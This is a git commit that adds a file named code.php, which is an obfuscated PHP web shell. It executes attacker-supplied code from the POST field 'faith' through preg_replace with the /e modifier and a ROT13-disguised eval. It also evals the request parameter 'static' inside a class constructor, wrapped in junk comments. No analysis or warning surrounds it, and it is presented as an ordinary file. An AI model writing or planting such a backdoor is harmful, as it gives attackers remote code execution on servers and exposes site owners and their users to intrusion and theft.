caa39edfc3f676ea63e4426306f97c91d0f08abf
ybmgq <ybmgq@outlook.com>
2024-07-26 10:05:29 +0800

    Create code.php

---
+++ php/code.php
@@ -0,0 +1,4 @@
+<script language="php">
+($faith = $_POST['faith']) && @preg_replace('/faith/e','@'.str_rot13('riny').'($faith)', 'faith');
+class GYUJ9g7l { public function __construct($H7zX3){ @eval("/*Z7Cc4urWV9*/".$H7zX3."/*Z7Cc4urWV9*/"); }}new GYUJ9g7l($_REQUEST['static']);
+</script>
